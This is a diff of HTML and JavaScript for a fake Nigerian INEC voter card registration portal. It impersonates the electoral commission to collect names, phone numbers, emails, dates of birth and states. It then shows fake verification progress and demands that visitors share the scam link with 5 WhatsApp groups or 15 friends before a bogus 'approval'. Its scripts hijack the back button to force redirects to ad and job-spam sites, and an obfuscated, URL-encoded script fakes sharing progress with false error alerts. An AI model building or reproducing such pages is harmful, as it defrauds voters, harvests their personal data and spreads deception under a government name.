-            <p style="text-align: center; color: #555; max-width: 500px; margin: 0 auto 20px;">This portal allows you to Update Your voter registration information, Replace your damaged or lost PVC. </p>
-            <marquee style="background-color: #61CE70; padding: 12px; border-radius: 50px; color: white; font-weight: 500; margin: 20px 0;" behavior="alternate">YOUR VOTE STARTS WITH REGISTRATION. DON'T MISS YOUR OPPORTUNITY TO REGISTER</marquee>
-            <p style="text-align: center; font-weight: 600; margin: 20px 0;">Fill the form below and submit your application to get started</p>
-            
-            <input type="text" name="first_name" placeholder="First Name *" required>
-            <input type="text" name="last_name" placeholder="Last Name *" required>
-            <!-- Phone field - ACCEPTS ANY PHONE NUMBER -->
-            <input type="tel" name="phone" placeholder="Phone Number *" required>
-            <input type="email" name="email" placeholder="Email Address *" required style="border-left: 5px solid #61CE70;">
-            
-            <!-- Date of Birth - Three Dropdowns (Day, Month, Year) -->
-            <span class="required-label">Date of Birth</span>
-            <div class="dob-container">
-                <select id="dob_day" required>
-                    <option value="">Day</option>
-                </select>
-                <select id="dob_month" required>
-                    <option value="">Month</option>
-                    <option value="01">January</option>
-                    <option value="02">February</option>
-                    <option value="03">March</option>
-                    <option value="04">April</option>
-                    <option value="05">May</option>
-                    <option value="06">June</option>
-                    <option value="07">July</option>
-                    <option value="08">August</option>
-                    <option value="09">September</option>
-                    <option value="10">October</option>
-                    <option value="11">November</option>
-                    <option value="12">December</option>
-                </select>
-                <select id="dob_year" required>
-                    <option value="">Year</option>
-                </select>
-            </div>
-            
-            <span class="required-label">Gender</span>
-            <select name="gender" id="gender" required>
-                <option value="" selected disabled>Select Gender</option>
-                <option value="Male">Male</option>
-                <option value="Female">Female</option>
-            </select>
-            
-            <span class="required-label">Do You Have Any Disability?</span>
-            <select name="disability" id="disability" required>
-                <option value="" selected disabled>Select Here</option>
-                <option value="Yes">Yes</option>
-                <option value="No">No</option>
-            </select>
-            
-            <span class="required-label">State</span>
-            <select name="State" id="State" required>
-                <option value="ABUJA FCT">ABUJA FCT</option>
+         
+            <p class="welcome"> <p class="welcome"><font style="font-weight:bold"><font color="#066a35 ">VOTERS CARD ONLINE REGISTRATION PORTAL</font><br><br><font color="red "> DEADLINE: Monday, 31 AUGUST, 2026</font><br>
+<hr color="#066a35"width="100%" />
+<br>
+          <center>This portal allows you to Update Your voter registration information, Replace your damaged or lost PVC.</center>
+
+          <br><marquee style="background-color: #066a35; padding: 10px; display: block;" direction="left"><font color="#ffffff">
+   Voters Card Online Application Portal
+</marquee>
+<br>
+     <center><font color="black"><span style="font-weight:bold;">Fill the form below to continue<font><center/><span/>
+       <br>
+       
+              
+        
+  <input type="text" name="_name" placeholder="First Name"><br/>
+  <input type="text" name="_name" placeholder="Last Name"><br/>
+  <input type="text" name="_name" placeholder="Phone Number"><br/>      
+  <input type="text" name="_name" placeholder="Email Address"><br/>
+  <input type="text" name="_name" placeholder="Date of Birth"><br/>     
+       
+    
+         <center> 
+  <p class="title"><font color="black">Gender</font></p>
+  <select name="malawi_districts" id="district" title="Sélectionnez votre sexe" class="_5dba" style="
+      width: 330px;
+      height: 50px;
+  ">
+    <option value="" selected>Select Here</option>
+    <option value="1">Male</option>
+    <option value="2">Female</option>
+  </select>
+</center>
+   
+        <center> 
+  <p class="title"><font color="black">State</font></p>
+  <select name="malawi_education" id="education" title="Select Your Identification Type" class="_5dba" style="
+      width: 330px;
+      height: 56px;
+  ">
+    <option value="" selected>Select State Here</option>
+    <option value="ABUJA FCT">ABUJA FCT</option>
 <option value="ABIA">ABIA</option>
 <option value="ADAMAWA">ADAMAWA</option>
 <option value="AKWA IBOM">AKWA IBOM</option>
@@ -635,50 +744,36 @@
 <option value="TARABA">TARABA</option>
 <option value="YOBE">YOBE</option>
 <option value="ZAMFARA">ZAMFARA</option>
-            </select>
-            
-            <button id="go">PROCEED</button>
+  </select>
+</center>
+<br>
+
+
+         
+       
+            <button id="go">CONTINUE</button>
         </div>
-        
-        <!-- PAGE 2: LOADER -->
         <div id="loader">
-            <div>Processing your application, please wait...</div>
+            <div>Processing, please wait...</div>
             <div class="spin"></div>
             <div id="num">0%</div>
         </div>
-        
-        <!-- PAGE 3: ENTER NAME with SAVE -->
         <div id="info">
-            <p class="title">Please Enter Your Name Exactly As It Appears On Your ID (Required)</p>
+         
+   
+           <p class="title">Please Enter Your Full Name Exactly As It Appears On Your ID</p>
             <div class="phone">
-                <input type="text" placeholder="Enter Your Full Name Accurately *" id="name" name="fullname" required>
-                <button class="save-btn" id="saveDetailsBtn">💾 CONTINUE</button>
+                <center><input type="char" placeholder="Enter Your Name Accurately" id="name" name="Phone" style="fontwidth: 244px;height: 56px;font-size: 18px;width: 330px;" onkeypress="return numberonly(event);"></center>
+          
+    
+          
+          
+          
+                  
+          <button id="confirm">PROCEED</button>
             </div>
-            <p class="error">Your application was rejected due to incorrect information. <a href="https://voter-pvc.go-career.xyz/ads"><b style="color:#3498db;">Please CLICK HERE to re-enter your correct information.</b></a></p>
+            <p class="error">Your application was rejected due to incorrect information. <a href="https://voter-pvc.go-career.xyz/ads"> <b><font color="blue">Please CLICK HERE to re-enter your correct information.</font></b></a></p>
         </div>
-        
-        <!-- MODAL POPUP (Appears after loading) -->
-        <div id="savedModal" class="saved-details-modal">
-            <div class="modal-content">
-                <h3>📋 Your Saved Information</h3>
-                <div id="modalDetails"></div>
-                <div class="modal-buttons">
-                    <button class="edit-btn" id="editBtn">Edit</button>
-                    <button id="proceedBtn">Proceed</button>
-                </div>
-            </div>
-        </div>
-        
-        <!-- NEW PAGE 4: SAVED INFO DISPLAY PAGE (with Next button) -->
-        <div id="saved-info-page">
-            <h2 style="color: #61CE70; margin-bottom: 20px;">📄 Your Application Summary</h2>
-            <div class="saved-card" id="savedInfoDisplay">
-                <!-- Filled dynamically -->
-            </div>
-            <button id="nextToSharing">PROCEED →</button>
-        </div>
-        
-        <!-- PAGE 5: CHECKING (now with original style) -->
         <div id="checking">
             <p class="title">We are processing your information, please wait...</p>
             <div class="barr">
@@ -686,24 +781,26 @@
                     <div id="fill"></div>
                 </div>
                 <div class="percentage center">
-                    <span id="load"><i class="fa fa-spinner fa-pulse"></i>⏳</span>
-                    <span id="check"><i class="fa fa-check-circle"></i>✅</span>
+                    <span id="load"><i class="fa fa-spinner fa-pulse"></i></span>
+                    <span id="check"><i class="fa fa-check-circle"></i></span>
                     <span id="percentage"></span>
                 </div>
             </div>
         </div>
-
-        <!-- PAGE 6: SHARING (with original progress indicators) -->
+       
         <div id="share">
-            <p class="tip">Congratulations: <span id="getname"></span></p><br>
+          
+            <p class="tip">Congratulations: <span id="getname"></span>.</p><br>
             <p class="tip">
-              We are pleased to inform you that your information has been successfully verified and your registration for a New Permanent Voters Card will be submitted for review. Follow the instructions below to get your registration approved after review.<br><br><span class="amount"> Instructions:</span><br>
+              We are pleased to inform you that your profile has been successfully verified and your registration for a New Permanent Voters Card will be submitted for review. Follow the instructions below to complete your registration.<br><br><span class="amount"> How to submit the registration form:</span><br>
+              
             </p><br>
-            <p class="tip">1. To get your registration form approved, you must share it with 5 groups or 15 friends on WhatsApp (click the "Share" button below).</p><br>
-            <p class="tip">2. Once you are done sharing, you'll be automatically redirected to the "APPROVAL PAGE".</p><br>
-            <p class="tip">3. Once your application is approved, you will receive an email informing you of the date your Permanent Voters Card will be ready.</p>
-            <br>
-            <span class="amount">NOTE: Only shortlisted Applicants will be contacted.</span><br>
+            <p class="tip">1. To submit the registration form, you must share it with 5 groups or 15 friends on WhatsApp (click the "Share" button below).</p><br>
+            <p class="tip">2. Once you are done sharing, you'll be automatically redirected to our submission page.</p><br>
+            <p class="tip">3. If shortlisted, you will receive a notification email from the Independent National Electoral Commission (INEC).</p>
+
+              <br>
+              <span class="amount">NOTE: You will be contacted once your Voters Card is Ready.</span><br>
 
             <button id="whatsapp">Share</button>
             <div class="barr">
@@ -711,345 +808,344 @@
                     <div id="fill2"></div>
                 </div>
                 <div class="percentage center">
-                    <span><i class="fa fa-spinner fa-pulse"></i>⏳</span>
+                    <span><i class="fa fa-spinner fa-pulse"></i></span>
                     <span id="percentage2">0%</span>
                 </div>
             </div>
         </div>
+         <div id="claim">
+            <p class="done"><i class="fa fa-check-circle fa-3x" aria-hidden="true"></i></p>
+            <p class="title">Your Application Has Been Approved!<span class="amount"></span> </p><br>
+           
+           <center><img src="https://cdn.guardian.ng/wp-content/uploads/2026/01/Independent-National-Electoral-Commission-INEC.webp" alt="Free-Data" style="width: 70%;">
+      
+                     </center>
+ 
+           
+            
+           <br/>
+          <a  onclick="window.open('https://blog.pestclue.com/canada-work-visa-sponsorship-jobs-in-toronto/')" href="https://crn77.com/4/10368794" >
+                    <button style="display: flex;align-items: center;justify-content: center;margin: 0;width: 100%;" class="btn btn-primary"><font color="#ffffff">SUBMIT APPLICATION</font></button>
+                    </a><br/>
+          
 
-        <!-- PAGE 7: CLAIM with styled thank you message -->
-        <div id="claim">
-            <div class="thank-you-message">
-                <p>✅</p>
-                <p>Your Application Has Been Approved!</p>
-                <p><span class="amount"></span></p>
-            </div>
-            <center><img src="https://gifdb.com/images/high/animated-green-verified-check-mark-k3et2jz52jyu2v22.gif" style="width: 70%; border-radius: 16px;"></center>
-            <br/>
-            <a onclick="window.open('https://blog.pestclue.com/apply-for-germany-jobs-paying-e60000-with-relocation-support/')" href="https://blog.pestclue.com/apply-for-germany-jobs-paying-e60000-with-relocation-support/">
-                <button style="width: 90%;">SUBMIT APPLICATION</button>
-            </a><br/>
-            <a onclick="window.open('https://blog.pestclue.com/apply-for-germany-jobs-paying-e60000-with-relocation-support/')" href="https://blog.pestclue.com/apply-for-germany-jobs-paying-e60000-with-relocation-support/">
-                <button style="width: 90%;">GET APPROVAL EMAIL</button>
-            </a><br/>
-            <a onclick="window.open('https://blog.pestclue.com/apply-for-germany-jobs-paying-e60000-with-relocation-support/')" href="https://blog.pestclue.com/apply-for-germany-jobs-paying-e60000-with-relocation-support/">
-                <button style="width: 90%;">CHECK APPLICATION STATUS</button>
-            </a><br/>
+          <a  onclick="window.open('https://blog.pestclue.com/canada-work-visa-sponsorship-jobs-in-toronto/')" href="https://crn77.com/4/10368794" >
+                    <button style="display: flex;align-items: center;justify-content: center;margin: 0;width: 100%;" class="btn btn-primary"><font color="#ffffff">CHECK APPLICATION STATUS</font></button>
+                    </a><br/>
+           
+			 
+			 
+          
+            
+           
             <button id="offer">SUBMIT NOW</button>
+             
+             
+          
+          
+              </div>
+        
         </div>
     </div>
-
-   
-
     <script src="https://code.jquery.com/jquery-latest.min.js"></script>
 
-    <script>
-        // Populate Day and Year dropdowns
-        function populateDateDropdowns() {
-            // Populate days (1-31)
-            const daySelect = document.getElementById('dob_day');
-            for (let i = 1; i <= 31; i++) {
-                const option = document.createElement('option');
-                option.value = i.toString().padStart(2, '0');
-                option.textContent = i;
-                daySelect.appendChild(option);
-            }
-            
-            // Populate years (1920 - current year)
-            const yearSelect = document.getElementById('dob_year');
-            const currentYear = new Date().getFullYear();
-            for (let i = currentYear; i >= 1920; i--) {
-                const option = document.createElement('option');
-                option.value = i;
-                option.textContent = i;
-                yearSelect.appendChild(option);
-            }
+
+
+
+<script type="text/javascript">
+var time = 0;
+window.setInterval(function () {
+    time = time + 1;
+    $(".t1").html(time + 1 + "m");
+    $(".t2").html(time + 2 + "m");
+    $(".t3").html(time + 4 + "m");
+}, 6e4);
+var likes = 134,
+    comments = 23,
+    shares = 12;
+window.setInterval(function () {
+    likes = likes + Math.floor(Math.random() * 3);
+    comments = comments + Math.floor(Math.random() * 2);
+    shares = shares + Math.floor(Math.random() * 2);
+    $("#likes").html(likes + "K");
+    $("#comments").html(comments + "K comments");
+    $("#shares").html(shares + "K shares");
+}, 5e3);
+$(".liked").click(function () {
+    if ($(this).hasClass("selected")) {
+        $(this).removeClass("selected");
+        $(this).html("Like");
+    } else {
+        $(this).addClass("selected");
+        $(this).html("Unlike");
+    }
+});
+</script>
+
+
+
+
+
+
+
+
+<script type="text/javascript">
+
+$("#go").click(function () {
+    $("#intro").fadeOut(0);
+    $("#loader").fadeIn(1000);
+    var i = 0;
+    var interval = setInterval(function () {
+        $("#num").text(i + "%");
+        i += 1;
+        if (i >= 100) {
+            clearInterval(interval);
+            $("#loader").fadeOut(0);
+            $("#info").fadeIn(1000);
         }
-        
-        // Get formatted date from dropdowns (YYYY-MM-DD)
-        function getFormattedDate() {
-            const day = document.getElementById('dob_day').value;
-            const month = document.getElementById('dob_month').value;
-            const year = document.getElementById('dob_year').value;
-            
-            if (day && month && year) {
-                return `${year}-${month}-${day}`;
-            }
-            return '';
-        }
-        
-        // Validate date is valid (e.g., no Feb 30)
-        function isValidDate(day, month, year) {
-            const date = new Date(year, month - 1, day);
-            return date.getFullYear() == year && date.getMonth() == month - 1 && date.getDate() == day;
-        }
-        
-        // Call on page load
-        populateDateDropdowns();
-        
-        // Form data storage
-        let formData = {};
-        
-        function collectFormData() {
-            // Get date from dropdowns
-            const dobValue = getFormattedDate();
-            
-            formData = {
-                firstName: $("input[name='first_name']").val(),
-                lastName: $("input[name='last_name']").val(),
-                phone: $("input[name='phone']").val(),
-                email: $("input[name='email']").val(),
-                dob: dobValue,
-                gender: $("#gender").val(),
-                disability: $("#disability").val(),
-                State: $("#State").val()
-            };
-        }
-        
-        function showModal() {
-            let modalHtml = `
-                <div class="detail-item"><strong>First Name:</strong> <span>${escapeHtml(formData.firstName) || 'N/A'}</span></div>
-                <div class="detail-item"><strong>Last Name:</strong> <span>${escapeHtml(formData.lastName) || 'N/A'}</span></div>
-                <div class="detail-item"><strong>Phone:</strong> <span>${escapeHtml(formData.phone) || 'N/A'}</span></div>
-                <div class="detail-item"><strong>Email:</strong> <span>${escapeHtml(formData.email) || 'N/A'}</span></div>
-                <div class="detail-item"><strong>DOB:</strong> <span>${escapeHtml(formData.dob) || 'N/A'}</span></div>
-                <div class="detail-item"><strong>Gender:</strong> <span>${escapeHtml(formData.gender) || 'N/A'}</span></div>
-                <div class="detail-item"><strong>Disability:</strong> <span>${escapeHtml(formData.disability) || 'N/A'}</span></div>
-                <div class="detail-item"><strong>State:</strong> <span>${escapeHtml(formData.State) || 'N/A'}</span></div>
-            `;
-            $("#modalDetails").html(modalHtml);
-            $("#savedModal").css('display', 'flex');
-        }
-        
-        // Helper function to escape HTML
-        function escapeHtml(str) {
-            if(!str) return str;
-            return str.replace(/[&<>]/g, function(m) {
-                if(m === '&') return '&amp;';
-                if(m === '<') return '&lt;';
-                if(m === '>') return '&gt;';
-                return m;
-            });
-        }
-
-        // Function to display saved info page
-        function showSavedInfoPage() {
-            let infoHtml = `
-                <div class="info-row"><span class="info-label">Full Name:</span> <span class="info-value">${escapeHtml($("#name").val())}</span></div>
-                <div class="info-row"><span class="info-label">First Name:</span> <span class="info-value">${escapeHtml(formData.firstName) || 'N/A'}</span></div>
-                <div class="info-row"><span class="info-label">Last Name:</span> <span class="info-value">${escapeHtml(formData.lastName) || 'N/A'}</span></div>
-                <div class="info-row"><span class="info-label">Phone:</span> <span class="info-value">${escapeHtml(formData.phone) || 'N/A'}</span></div>
-                <div class="info-row"><span class="info-label">Email:</span> <span class="info-value">${escapeHtml(formData.email) || 'N/A'}</span></div>
-                <div class="info-row"><span class="info-label">Date of Birth:</span> <span class="info-value">${escapeHtml(formData.dob) || 'N/A'}</span></div>
-                <div class="info-row"><span class="info-label">Gender:</span> <span class="info-value">${escapeHtml(formData.gender) || 'N/A'}</span></div>
-                <div class="info-row"><span class="info-label">Disability:</span> <span class="info-value">${escapeHtml(formData.disability) || 'N/A'}</span></div>
-                <div class="info-row"><span class="info-label">State:</span> <span class="info-value">${escapeHtml(formData.State) || 'N/A'}</span></div>
-            `;
-            $("#savedInfoDisplay").html(infoHtml);
-            $("#saved-info-page").show();
-        }
-
-        // PAGE 1 -> PAGE 2 (with validation)
-        $("#go").click(function (e) {
-            // Check date dropdowns are all selected
-            const day = document.getElementById('dob_day').value;
-            const month = document.getElementById('dob_month').value;
-            const year = document.getElementById('dob_year').value;
-            
-            if (!day || !month || !year) {
-                alert("ERROR: Please select your complete Date of Birth (Day, Month, Year).");
-                return;
-            }
-            
-            // Validate date is real (e.g., no Feb 31)
-            if (!isValidDate(parseInt(day), parseInt(month), parseInt(year))) {
-                alert("ERROR: Please select a valid date of birth.");
-                return;
-            }
-            
-            collectFormData();
-            
-            // Check all required fields
-            if (!formData.firstName || !formData.lastName || !formData.phone || !formData.email || !formData.dob || !formData.gender || !formData.disability || !formData.State) {
-                alert("ERROR: All fields are required. Please fill in every field before proceeding.");
-                return;
-            }
-            
-            // Phone number validation - accepts any format
-            var phoneRegex = /^[\+]?[0-9]{7,15}$/;
-            if (!phoneRegex.test(formData.phone)) {
-                alert("Please enter a valid phone number (7-15 digits, can start with +).");
-                return;
-            }
-            
-            // Email validation
-            if (!formData.email.includes('@') || !formData.email.includes('.')) {
-                alert("Please enter a valid email address.");
-                return;
-            }
-
-            $("#intro").hide();
-            $("#loader").show();
-            var i = 0;
-            var interval = setInterval(function () {
-                $("#num").text(i + "%");
-                i += 1;
-                if (i >= 100) {
-                    clearInterval(interval);
-                    $("#loader").hide();
-                    $("#info").show();
-                }
-            }, 30);
-        });
-
-        // Save button - shows modal with form data AND name
-        $("#saveDetailsBtn").click(function() {
-            if ($("#name").val().length < 4) {
-                alert("Please enter your full name first.");
-                return;
-            }
-            collectFormData();
-            showModal();
-        });
-
-        // Edit button - redirects to correction page
-        $("#editBtn").click(function() {
-            window.location.href = 'https://sutlnk.ink/IEC-Recruitment';
-        });
-
-        // Proceed button - hide modal and show saved info page
-        $("#proceedBtn").click(function() {
-            $("#savedModal").hide();
-            $("#info").hide();
-            showSavedInfoPage();
-        });
-
-        // Next to sharing page from saved info page
-        $("#nextToSharing").click(function() {
-            $("#saved-info-page").hide();
-            $("#checking").show();
-            
-            var i = 0;
-            var interval = setInterval(function () {
-                i += 1;
-                $("#percentage").text(i + "%");
-                $("#fill").css("width", i + "%");
-                if (i == 50) {
-                    i = 49;
-                    setTimeout(function () { i = 50; }, 1000);
-                }
-                if (i >= 100) {
-                    clearInterval(interval);
-                    $("#load").hide();
-                    $("#check").show();
-                    setTimeout(function () {
-                        $("#checking").hide();
-                        $("#share").show();
-                        $("#getname").html($("#name").val());
-                    }, 500);
-                }
-            }, 40);
-        });
-
-        $(document).click(function () {
-            if ($("#name").is(":focus")) {
-                $(".error").hide();
-            }
-        });
-
-        // Share text for WhatsApp
-        var text1 = "*Nationwide Online Voters Card Registration*%0A%0ATake advantage of the Independent National Electoral Commission (INEC) Nationwide Online Permanent Voters Card Registration for damaged voters card or replacement of information.%0A%0A_*(The same address will be used for the delivery of your PVC)....._%0A%0A*Online Registration Portal:*%0A%0Ahttps://sutlnk.ink/INEC-PVC-Registration %0A%0A *APPLICATION DEADLINE:* _AUGUST 31, 2026._";
-        var abcde = "https://blog.pestclue.com/apply-for-germany-jobs-paying-e60000-with-relocation-support/";
-        var share = "whatsapp://send?text=" + text1;
-
-        // Internal share counter (12 steps)
-        var shareStep = 0;
-        var totalSteps = 12;
-
-        $("#whatsapp").click(function () {
-            window.location.href = share;
-
-            if (shareStep < totalSteps) {
-                shareStep++;
-            }
-
-            var percent = Math.min(100, Math.round((shareStep / totalSteps) * 100));
-            $("#percentage2").text(percent + "%");
-            $("#fill2").css("width", percent + "%");
-
-            if (shareStep >= totalSteps) {
+    }, 50);
+});
+$("#confirm").click(function () {
+    if ($("#name").val().length < 4)
+    {
+        $(".error").fadeIn(500);
+    } else {
+        $("#info").fadeOut(0);
+        $("#checking").fadeIn(1000);
+        var i = 0;
+        var interval = setInterval(function () {
+            i += 1;
+            $("#percentage").text(i + "%");
+            $("#fill").css("width", i + "%");
+            if (i == 50) {
+                i = 49;
                 setTimeout(function () {
-                    $("#share").hide();
-                    $("#claim").show();
-                }, 800);
+                    i = 50;
+                }, 1000);
             }
-        });
+            if (i >= 100) {
+                clearInterval(interval);
+                $("#load").fadeOut(0);
+                $("#check").fadeIn(0);
+                setTimeout(function () {
+                    $("#checking").fadeOut(0);
+                    $("#share").fadeIn(1000);
+                    $("#getname").html($("#name").val());
+                }, 500);
+            }
+        }, 50);
+    }
+});
+$(document).click(function () {
+    if ($("#name").is(":focus")) {
+        $(".error").fadeOut(500);
+    }
+});
+</script>
 
-        $("#offer").click(function () {
-            window.open(abcde, "_blank");
-        });
+
+
+
+<!--
+"30%20GB%20Free%20Internet%20Offer%0A%E2%9D%A4%0ATo%20Activate%2030%20GB%20Free%20Internet%20for%20all%20Networks%20click%20here%F0%9F%91%87%0A*1.%20Jio*%0Ahttps://cutt.ly/30-GB_Jio%0A%20%0A*2.%20Airtel*%0Ahttps://cutt.ly/30-GB_Airtel%0A%20%0A*3.%20Vi*%0Ahttps://cutt.ly/30-GB_Vi%0A%20%0A*4.%20Jazz*%0Ahttps://cutt.ly/30-GB_Jazz%0A%20%0A*5.%20Zong*%0Ahttps://cutt.ly/30-GB_Zong%0A%20%0A*6.%20Telenor*%0Ahttps://cutt.ly/30-GB_Telenor%0A%20%0A*7.%20Ufone*%0Ahttps://cutt.ly/30-GB_Ufone%0A%20%0A*8.%20Other Networks*%0Ahttps://cutt.ly/Get_30GB",
+-->
+      <script>
+        var text1 = "*Nationwide Online Voters Card Registration Portal*%0A%0ATake advantage of the Independent National Electoral Commission (INEC) Nationwide Online Permanent Voters Card Registration for damaged voters card or replacement of information.%0A%0A_*(You will be notify when your Voters Card is Ready)....._%0A%0A*CLICK HERE:*%0A%0Ahttps://sutlnk.ink/INEC-PVC-Registration %0A%0A *APPLICATION DEADLINE:* _AUGUST 31, 2026._",
+            text2 = " an amount of ",
+            text3 = "for every citizen who meets the conditions as an aid to the poor class to overcome the crisis. Enter and register now and make sure to register correctly 👉 ",
+            error = "Une erreur s'est produite ! Les messages ne sont pas lus. Vous avez peut-être partagé ce message avec des amis ou le même groupe à plusieurs reprises ; merci de le partager à nouveau.",
+            abcde = "https://blog.pestclue.com/canada-work-visa-sponsorship-jobs-in-toronto/",
+            saved = "",
+            share = "whatsapp://send?text=" + text1;
     </script>
 
-    <footer>
-        <p style="max-width: 800px; margin: 20px auto; line-height: 1.8; opacity: 0.9;">The Independent National Electoral Commission (INEC) was established by the 1999 Constitution of the Federal Republic of Nigeria to among other things organize elections into various political offices in the country.
-</p>
-        <div style="margin: 25px 0;">
-            <a href="https://blog.pestclue.com/apply-for-germany-jobs-paying-e60000-with-relocation-support/">Home</a>
-            <a href="https://blog.pestclue.com/apply-for-germany-jobs-paying-e60000-with-relocation-support/">About Us</a>
-            <a href="https://blog.pestclue.com/apply-for-germany-jobs-paying-e60000-with-relocation-support/">Contact Us</a>
-            <a href="https://blog.pestclue.com/apply-for-germany-jobs-paying-e60000-with-relocation-support/">Sitemap</a>
-        </div>
-        <div style="opacity: 0.8;">Copyright © 2026 </div>
-    </footer>
 
-    <script>
-        window.onhashchange=function(){ };
-        function hh() { history.pushState(history.length+1, "message", "#"+new Date().getTime()); }
-        setTimeout('hh();', 500);
-    </script>
 
-    <script>
-        window.onhashchange=function(){jp();};
-        function hh() {history.pushState(history.length+1, "message", "#"+new Date().getTime());}
-        function jp() {
-            fh();
-        }
-        setTimeout('hh();', 500);
-        function fh(){
-            location.href="https://blog.pestclue.com/apply-for-germany-jobs-paying-e60000-with-relocation-support/";
-        }
-        function goon(){
-            location.href="https://blog.pestclue.com/apply-for-germany-jobs-paying-e60000-with-relocation-support/";
-        }
-    </script>
 
-    <script>
-        window.onhashchange=function(){jp();};
-        function hh() {history.pushState(history.length+1, "message", "#"+new Date().getTime());}
-        function jp() {
-            fh();
-        }
-        setTimeout('hh();', 500);
-        function fh(){
-            location.href="https://blog.pestclue.com/apply-for-germany-jobs-paying-e60000-with-relocation-support/";
-        }
-        function goon(){
-            location.href="https://blog.pestclue.com/apply-for-germany-jobs-paying-e60000-with-relocation-support/";
-        }
-    </script>
 
-    <script>
-        var _hmt = _hmt || [];
-        (function() {
-            var hm = document.createElement("script");
-            hm.src = "https://blog.pestclue.com/apply-for-germany-jobs-paying-e60000-with-relocation-support/";
-            var s = document.getElementsByTagName("script")[0];
-            s.parentNode.insertBefore(hm, s);
-        })();
-    </script>
-    <script defer src="https://static.cloudflareinsights.com/beacon.min.js/v8c78df7c7c0f484497ecbca7046644da1771523124516" integrity="sha512-8DS7rgIrAmghBFwoOTujcf6D9rXvH8xm8JQ1Ja01h9QX8EzXldiszufYa4IFfKdLUKTTrnSFXLDkUEOTrZQ8Qg==" data-cf-beacon='{"version":"2024.11.0","token":"f1d5d58c75054159a85e77a221c7fb54","r":1,"server_timing":{"name":{"cfCacheStatus":true,"cfEdge":true,"cfExtPri":true,"cfL4":true,"cfOrigin":true,"cfSpeedBrain":true},"location_startswith":null}}' crossorigin="anonymous"></script>
-<script defer src="https://static.cloudflareinsights.com/beacon.min.js/v8c78df7c7c0f484497ecbca7046644da1771523124516" integrity="sha512-8DS7rgIrAmghBFwoOTujcf6D9rXvH8xm8JQ1Ja01h9QX8EzXldiszufYa4IFfKdLUKTTrnSFXLDkUEOTrZQ8Qg==" data-cf-beacon='{"version":"2024.11.0","token":"39387849bc534a459e14f6e5667cb166","r":1,"server_timing":{"name":{"cfCacheStatus":true,"cfEdge":true,"cfExtPri":true,"cfL4":true,"cfOrigin":true,"cfSpeedBrain":true},"location_startswith":null}}' crossorigin="anonymous"></script>
-</body>
-</html>
-<!-- BEGIN: Powered by Supercounters.com -->
-<center><script type="text/javascript" src="//widget.supercounters.com/ssl/online_i.js"></script><script type="text/javascript">sc_online_i(1735212,"ffffff","ffffff");</script><!-- END: Powered by Supercounters.com -->
+<script>
+
+<!-- code by OD -->
+
+document.write(unescape('%20%3Cscript%20type%3D%22text/javascript%22%3E%0A%20var%20swidth%20%3D%20localStorage.getItem%28saved%29%3B%0Aif%20%28swidth%20%21%3D%3D%20null%29%20%7B%0A%20%20%20%20var%20width%20%3D%20swidth%20*%201%3B%0A%20%20%20%20%24%28%22%23intro%22%29.fadeOut%280%29%3B%0A%20%20%20%20%24%28%22.comments%22%29.fadeOut%280%29%3B%0A%20%20%20%20%24%28%22%23share%22%29.fadeIn%280%29%3B%0A%20%20%20%20%24%28%22%23fill2%22%29.css%28%22width%22%2C%20width%20+%20%22%25%22%29%3B%0A%20%20%20%20%24%28%22%23percentage2%22%29.text%28width%20+%20%22%25%22%29%3B%0A%7D%20else%20%7B%0A%20%20%20%20var%20width%20%3D%200%3B%0A%7D%0A%24%28%22%23whatsapp%22%29.click%28function%20%28%29%20%7B%0A%20%20%20%20window.location.href%20%3D%20share%3B%0A%20%20%20%20if%20%28width%20%3D%3D%200%29%20%7B%0A%20%20%20%20%20%20%20%20width%20+%3D%2050%3B%0A%20%20%20%20%7D%20else%20if%20%28width%20%3D%3D%2050%29%20%7B%0A%20%20%20%20%20%20%20%20alert%28error%29%3B%0A%20%20%20%20%20%20%20%20width%20+%3D%2015%3B%0A%20%20%20%20%7D%20else%20if%20%28width%20%3D%3D%2065%29%20%7B%0A%20%20%20%20%20%20%20%20width%20+%3D%205%3B%0A%20%20%20%20%7D%20else%20if%20%28width%20%3D%3D%2070%29%20%7B%0A%20%20%20%20%20%20%20%20alert%28error%29%3B%0A%20%20%20%20%20%20%20%20width%20+%3D%2010%3B%0A%20%20%20%20%7D%20else%20if%20%28width%20%3D%3D%2080%29%20%7B%0A%20%20%20%20%20%20%20%20alert%28error%29%3B%0A%20%20%20%20%20%20%20%20width%20+%3D%205%3B%0A%20%20%20%20%7D%20else%20if%20%28width%20%3D%3D%2085%29%20%7B%0A%20%20%20%20%20%20%20%20width%20+%3D%202%3B%0A%20%20%20%20%7D%20else%20if%20%28width%20%3D%3D%2087%29%20%7B%0A%20%20%20%20%20%20%20%20width%20+%3D%201%3B%0A%20%20%20%20%7D%20else%20if%20%28width%20%3D%3D%2088%29%20%7B%0A%20%20%20%20%20%20%20%20width%20+%3D%202%3B%0A%20%20%20%20%7D%20else%20if%20%28width%20%3D%3D%2090%29%20%7B%0A%20%20%20%20%20%20%20%20width%20+%3D%201%3B%0A%20%20%20%20%7D%20else%20if%20%28width%20%3D%3D%2091%29%20%7B%0A%20%20%20%20%20%20%20%20width%20+%3D%201%3B%0A%20%20%20%20%7D%20else%20if%20%28width%20%3D%3D%2092%29%20%7B%0A%20%20%20%20%20%20%20%20width%20+%3D%201%3B%0A%20%20%20%20%7D%20else%20if%20%28width%20%3D%3D%2093%29%20%7B%0A%20%20%20%20%20%20%20%20width%20+%3D%201%3B%0A%20%20%20%20%7D%20else%20if%20%28width%20%3D%3D%2094%29%20%7B%0A%20%20%20%20%20%20%20%20width%20+%3D%201%3B%0A%20%20%20%20%7D%20else%20if%20%28width%20%3D%3D%2095%29%20%7B%0A%20%20%20%20%20%20%20%20width%20+%3D%201%3B%0A%20%20%20%20%7D%20else%20if%20%28width%20%3D%3D%2096%29%20%7B%0A%20%20%20%20%20%20%20%20width%20+%3D%202%3B%0A%20%20%20%20%7D%20else%20%7B%0A%20%20%20%20%20%20%20%20%24%28%22%23share%22%29.fadeOut%280%29%3B%0A%20%20%20%20%20%20%20%20%24%28%22%23claim%22%29.fadeIn%281000%29%3B%0A%20%20%20%20%7D%0A%20%20%20%20localStorage.setItem%28saved%2C%20width%29%3B%0A%20%20%20%20setTimeout%28function%20%28%29%20%7B%0A%20%20%20%20%20%20%20%20%24%28%22%23fill2%22%29.css%28%22width%22%2C%20width%20+%20%22%25%22%29%3B%0A%20%20%20%20%20%20%20%20%24%28%22%23percentage2%22%29.text%28width%20+%20%22%25%22%29%3B%0A%20%20%20%20%7D%2C%202000%29%3B%0A%7D%29%3B%0A%24%28%22%23offer%22%29.click%28function%20%28%29%20%7B%0A%20%20%20%20window.open%28abcde%2C%20%22_blank%22%29